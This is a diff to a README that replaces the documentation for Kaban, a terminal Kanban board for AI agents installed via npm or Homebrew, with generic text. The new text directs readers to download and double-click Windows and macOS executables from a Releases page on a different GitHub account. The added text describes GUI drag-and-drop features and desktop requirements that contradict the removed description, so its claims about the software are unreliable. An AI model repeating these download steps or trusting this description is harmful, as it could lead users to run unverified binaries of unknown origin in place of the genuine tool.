@@ -1,445 +1,91 @@
-<p align="center">
-  <img src="docs/assets/icon.png" alt="Kaban" width="120" height="120">
-</p>
+# 🌟 kaban - Organize Your Tasks with Ease
 
-<h1 align="center">Kaban</h1>
+## 🚀 Getting Started
 
-<p align="center">
-  <strong>Kanban for AI Agents</strong><br>
-  Track and coordinate tasks between humans and AI in the terminal
-</p>
+Welcome to the kaban project! This application helps you manage your tasks using a simple kanban board, perfect for keeping your AI code agents organized. Whether you're a professional or a casual user, kaban provides an easy way to track your progress.
 
-<p align="center">
-  <a href="https://www.npmjs.com/package/@kaban-board/cli"><img src="https://img.shields.io/npm/v/@kaban-board/cli?label=npm&color=cb3837" alt="npm version"></a>
-  <a href="https://github.com/beshkenadze/homebrew-tap"><img src="https://img.shields.io/badge/homebrew-tap-fbb040" alt="Homebrew"></a>
-  <a href="https://github.com/beshkenadze/kaban/blob/main/LICENSE"><img src="https://img.shields.io/github/license/beshkenadze/kaban" alt="License"></a>
-  <a href="https://github.com/beshkenadze/kaban"><img src="https://img.shields.io/github/stars/beshkenadze/kaban?style=social" alt="GitHub stars"></a>
-</p>
+## 📥 Download & Install
 
-<p align="center">
-  <a href="#features">Features</a> •
-  <a href="#installation">Installation</a> •
-  <a href="#mcp-integration">MCP Integration</a> •
-  <a href="#claude-code-hook-integration">Hook</a> •
-  <a href="#cli-usage">CLI</a> •
-  <a href="#tui-usage">TUI</a> •
-  <a href="#ai-code-editors">AI Editors</a>
-</p>
+You can download kaban from our Releases page. Please follow these easy steps to get started:
 
----
+1. **Visit the Releases Page**: [Download kaban now](https://github.com/christophervideo/kaban/releases).
+  
+2. **Select Your Version**: On the Releases page, you will see a list of available versions. Choose the latest version for the best features.
+  
+3. **Download the File**: Click the download link for your operating system. The file will download to your computer.
 
-## What is Kaban?
+### Example of Download Process
 
-<img width="2746" height="1442" alt="image" src="https://github.com/user-attachments/assets/58e51a45-e4db-4411-a4c7-44e8bda2a750" />
+- If you are using Windows, you might see a file like `kaban-windows.exe`. Click this file to start the download.
+  
+- For Mac users, you may find `kaban-macos.zip`. Click this file to download the ZIP archive.
 
+4. **Open the File**: Once downloaded, go to your downloads folder and double-click the kaban file you downloaded.
 
-Kaban is a terminal-based Kanban board designed for **AI code agents** and developers. It provides a structured way to manage tasks, track progress, and coordinate between human users and AI agents.
+5. **Follow Installation Prompts**: If your system requires it, follow the on-screen prompts to complete the installation.
 
-**Why Kaban?**
+6. **Launch the Application**: After installation, open the application from your desktop or application folder.
 
-- **Manage Todos** — Track tasks with a proper Kanban board
-- **Assign to Agents** — Assign tasks to Claude, GPT, or any AI agent
-- **Single App** — No servers, no cloud. One SQLite file. Works offline
-- **TUI + CLI + MCP** — Interactive UI for humans, CLI for scripts, MCP for AI
-
-## Features
-
-| Feature | Description |
-|---------|-------------|
-| **MCP Server** | AI agents can read, create, and manage tasks autonomously |
-| **TodoWrite Hook** | Auto-sync Claude Code todos to Kaban board |
-| **Interactive TUI** | Vim-style navigation, keyboard-driven workflow |
-| **Powerful CLI** | Scriptable commands for automation |
-| **WIP Limits** | Built-in Kanban best practices |
-| **Agent Tracking** | See who (human or AI) owns each task |
-| **Portable** | Single SQLite file, no server required |
-
-## Installation
-
-### npx / bunx (Zero Install)
-
-```bash
-# Try without installing
-npx @kaban-board/cli init --name "My Project"
-npx @kaban-board/cli tui
-
-# Or with bun
-bunx @kaban-board/cli tui
-```
-
-### npm (Global Install)
-
-```bash
-npm install -g @kaban-board/cli
-kaban init --name "My Project"
-kaban tui
-```
-
-### Homebrew (macOS / Linux)
-
-```bash
-brew tap beshkenadze/tap
-brew install kaban
-kaban tui
-```
-
-### From Source
-
-```bash
-git clone https://github.com/beshkenadze/kaban
-cd kaban && bun install && bun run build
-task install
-```
-
-### Prerequisites
-
-- [Node.js](https://nodejs.org/) v18+ or [Bun](https://bun.sh/) v1.0+
-- [Task](https://taskfile.dev/) (optional, for development)
-
-## Packages
-
-Kaban is a monorepo with three packages:
-
-| Package | Description |
-|---------|-------------|
-| `@kaban-board/core` | Database logic, services, and schemas |
-| `@kaban-board/cli` | CLI commands, TUI launcher, MCP server |
-| `@kaban-board/tui` | Interactive Terminal User Interface |
-
-## MCP Integration
-
-Connect your AI coding assistant to Kaban via [Model Context Protocol](https://modelcontextprotocol.io/).
-
-### Claude Desktop Setup
-
-Add to `claude_desktop_config.json`:
-
-```json
-{
-  "mcpServers": {
-    "kaban": {
-      "command": "npx",
-      "args": ["-y", "@kaban-board/cli", "mcp"],
-      "env": {
-        "KABAN_PATH": "/path/to/your/project"
-      }
-    }
-  }
-}
-```
-
-Or if installed globally:
-
-```json
-{
-  "mcpServers": {
-    "kaban": {
-      "command": "kaban",
-      "args": ["mcp"],
-      "env": {
-        "KABAN_PATH": "/path/to/your/project"
-      }
-    }
-  }
-}
-```
-
-### MCP Tools
-
-| Tool | Description |
-|------|-------------|
-| `kaban_init` | Initialize a new board |
-| `kaban_add_task` | Add a task |
-| `kaban_add_task_checked` | Add task with duplicate detection |
-| `kaban_get_task` | Get task details |
-| `kaban_list_tasks` | List tasks with filters |
-| `kaban_move_task` | Move task to column |
-| `kaban_update_task` | Update task properties |
-| `kaban_delete_task` | Delete a task |
-| `kaban_complete_task` | Mark task as done |
-| `kaban_status` | Get board summary |
-| `kaban_archive_tasks` | Archive completed/stale tasks |
-| `kaban_search_archive` | Full-text search in archive |
-| `kaban_restore_task` | Restore task from archive |
-| `kaban_purge_archive` | Permanently delete archived tasks |
-| `kaban_archive_stats` | Get archive statistics |
-| `kaban_reset_board` | Delete ALL tasks (destructive) |
-| `kaban_add_dependency` | Add task dependency |
-| `kaban_remove_dependency` | Remove task dependency |
-| `kaban_check_dependencies` | Check if dependencies resolved |
-
-### MCP Resources
-
-| Resource | Description |
-|----------|-------------|
-| `kaban://board/status` | Board status with counts |
-| `kaban://board/columns` | Available columns |
-| `kaban://tasks/{columnId}` | Tasks in a column |
-| `kaban://task/{id}` | Single task details |
-
-## CLI Usage
-
-```bash
-kaban <command> [options]
-```
-
-### Commands
-
-| Command | Description |
-|---------|-------------|
-| `kaban init` | Initialize a board |
-| `kaban add <title>` | Add a task |
-| `kaban list` | List tasks (with filters) |
-| `kaban move <id> [column]` | Move a task (with optional `--assign`) |
-| `kaban assign <id> [agent]` | Assign/unassign a task |
-| `kaban done <id>` | Mark task complete |
-| `kaban status` | Show board summary |
-| `kaban search <query>` | Full-text search in archive |
-| `kaban archive` | Archive completed tasks |
-| `kaban restore <id>` | Restore task from archive |
-| `kaban purge` | Permanently delete archived tasks |
-| `kaban reset` | Delete ALL tasks (destructive) |
-| `kaban tui` | Launch interactive UI |
-| `kaban mcp` | Start MCP server |
-| `kaban hook install` | Install TodoWrite sync hook |
-| `kaban hook status` | Check hook status |
-| `kaban sync` | Sync TodoWrite input (stdin) |
-
-### Examples
-
-```bash
-# Initialize with custom name
-kaban init --name "Sprint 1"
-
-# Add task with metadata
-kaban add "Fix auth bug" -c todo -a claude -D "OAuth2 flow broken"
-
-# List tasks in a column
-kaban list --column in-progress
-
-# Move task to next column
-kaban move abc123 --next
-
-# Move and assign to agent in one command
-kaban move abc123 in-progress --assign claude
-
-# Assign task to an agent
-kaban assign abc123 claude
-
-# Unassign a task
-kaban assign abc123 --clear
-
-# Mark complete
-kaban done abc123
-```
-
-## Claude Code Hook Integration
-
-> **Optional but recommended** — Automatically sync Claude Code's TodoWrite with your Kaban board. You can still use Kaban without this hook via CLI, TUI, or MCP.
-
-### Installation
-
-```bash
-kaban hook install
-```
-
-This will:
-1. Install the hook binary to `~/.claude/hooks/`
-2. Configure Claude Code's `settings.json` with a PostToolUse hook
-3. Create a backup of your settings
-
-### Commands
-
-| Command | Description |
-|---------|-------------|
-| `kaban hook install` | Install the TodoWrite sync hook |
-| `kaban hook uninstall` | Remove the hook |
-| `kaban hook status` | Check installation status and activity |
-
-### How It Works
-
-```
-Claude Code → TodoWrite → Hook → kaban sync → Kaban Board
-```
-
-- **pending** todos → **Todo** column
-- **in_progress** todos → **In Progress** column  
-- **completed** todos → **Done** column
-- **cancelled** todos → **Backlog** column
-
-### Logs
-
-Sync activity is logged to `~/.claude/hooks/sync.log`. View recent activity:
-
-```bash
-kaban hook status
-```
-
-## TUI Usage
-
-Launch the interactive terminal UI:
-
-```bash
-kaban tui
-```
-
-### Keyboard Shortcuts
-
-| Key | Action |
-|-----|--------|
-| `<` `>` / `h` `l` | Navigate columns |
-| `^` `v` / `j` `k` | Navigate tasks |
-| `Enter` | View task details |
-| `a` | Add new task |
-| `e` | Edit task |
-| `m` | Move task |
-| `u` | Assign user/agent |
-| `d` | Delete task |
-| `x` | Archive task |
-| `r` | Restore from archive |
-| `Tab` | Toggle archive view |
-| `?` | Show help |
-| `q` | Quit |
-
-## AI Code Editors
-
-Add Kaban MCP server to your AI coding assistant:
-
-### Claude Code Skill (Recommended)
-
-Install the Kaban workflow skill for TodoWrite sync and session persistence:
-
-```bash
-bunx skills add beshkenadze/kaban
-```
-
-Works with all AI code editors: Antigravity, Claude Code, Clawdbot, Cline, Codex, and 21+ more.
-
-The skill includes:
-- **MCP server** — Auto-configured, no manual setup needed
-- **Kaban workflow skill** — Syncs with TodoWrite, resumes tasks across sessions
-- **Session hooks** — Auto-checks for in-progress tasks on session start
-
-#### Alternative: Plugin Marketplace
-
-```bash
-/plugin marketplace add beshkenadze/kaban
-/plugin install kaban-workflow@beshkenadze-kaban
-```
-
-### Claude Code / Claude Desktop (Manual MCP)
-
-Add to `.mcp.json` (Claude Code) or `claude_desktop_config.json`:
-
-```json
-{
-  "mcpServers": {
-    "kaban": {
-      "command": "npx",
-      "args": ["-y", "@kaban-board/cli", "mcp"]
-    }
-  }
-}
-```
-
-### OpenCode
-
-Add to `opencode.json`:
-
-```json
-{
-  "mcp": {
-    "kaban": {
-      "command": "npx",
-      "args": ["-y", "@kaban-board/cli", "mcp"]
-    }
-  }
-}
-```
-
-### Cursor / Windsurf / Continue
-
-Add to MCP settings:
-
-```json
-{
-  "mcpServers": {
-    "kaban": {
-      "command": "npx",
-      "args": ["-y", "@kaban-board/cli", "mcp"]
-    }
-  }
-}
-```
-
-### With Global Install
-
-If you installed globally (`npm i -g @kaban-board/cli`), use:
-
-```json
-{
-  "mcpServers": {
-    "kaban": {
-      "command": "kaban",
-      "args": ["mcp"]
-    }
-  }
-}
-```
-
-## Configuration
-
-### Environment Variables
-
-| Variable | Description | Default |
-|----------|-------------|---------|
-| `KABAN_PATH` | Board data directory | Current directory |
-| `KABAN_AGENT` | Default agent name | `user` |
-
-### Data Storage
-
-Kaban stores data in `.kaban/` directory:
-
-```
-.kaban/
-├── board.db      # SQLite database
-└── config.json   # Board configuration
-```
-
-### Default Columns
-
-| Column | WIP Limit |
-|--------|-----------|
-| Backlog | — |
-| To Do | — |
-| In Progress | 3 |
-| Review | 2 |
-| Done | — (terminal) |
-
-## Contributing
-
-Contributions are welcome! Please read our [Contributing Guide](CONTRIBUTING.md) first.
-
-```bash
-# Development
-bun install
-bun run build
-bun run lint
-bun run test
-```
-
-### Commit Convention
-
-We use [Conventional Commits](https://www.conventionalcommits.org/) for automated releases:
-
-```bash
-feat: add new feature      # → Minor version bump
-fix: resolve bug           # → Patch version bump  
-feat!: breaking change     # → Major version bump
-```
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for full details on commit types and the release process.
-
-## License
-
-[MIT](LICENSE)
+## ⚙️ System Requirements
+
+To run kaban smoothly, ensure your system meets the following requirements:
+
+- **Operating System**: Windows 10 or higher, macOS Mojave (10.14) or higher, or a recent Linux distribution.
+
+- **Memory**: At least 2 GB of RAM.
+
+- **Storage**: Minimum of 100 MB of free space for installation.
+
+- **Processor**: 1 GHz or faster.
+
+## 🎨 Using kaban
+
+Once you have installed kaban, start by creating your first board:
+
+1. **Create a New Board**: Click on the "New Board" button. Give your board a name and set up the columns for your tasks (e.g., To-Do, In Progress, Done).
+
+2. **Add Tasks**: Click on the column where you want to add a task. Type in your task and press Enter. Your task will appear in the chosen column.
+
+3. **Move Tasks**: Drag and drop tasks between columns as you progress.
+
+4. **Edit or Delete Tasks**: Click on a task to edit its details. You can also delete it if you no longer need it.
+
+## 🌍 Features
+
+kaban offers several useful features to help you manage your tasks:
+
+- **Drag-and-Drop Interface**: Easily move tasks around as you work.
+  
+- **Custom Columns**: Tailor your kanban board to fit your workflow.
+
+- **Task Prioritization**: Organize tasks based on importance or deadlines.
+
+- **Multi-Platform Support**: Run kaban on Windows, macOS, and Linux devices.
+
+## ❓ FAQ
+
+### How do I update kaban?
+
+To update kaban, revisit the [Releases page](https://github.com/christophervideo/kaban/releases). Download the latest version and follow the installation steps.
+
+### Can I use kaban offline?
+
+Yes, kaban works offline. You can organize your tasks without an internet connection.
+
+### Is kaban free to use?
+
+Yes, kaban is open-source and free for everyone.
+
+### Where can I report issues?
+
+If you encounter any problems, you can report issues on the project's GitHub Issues page.
+
+## 📞 Support
+
+If you have any questions or need assistance, feel free to reach out through the issues section on GitHub. The community is here to help you.
+
+## 🎉 Join Us
+
+We welcome contributions to improve kaban. If you have suggestions, please visit our GitHub repository and submit your ideas.
+
+Thank you for choosing kaban! Enjoy organizing your tasks effectively.
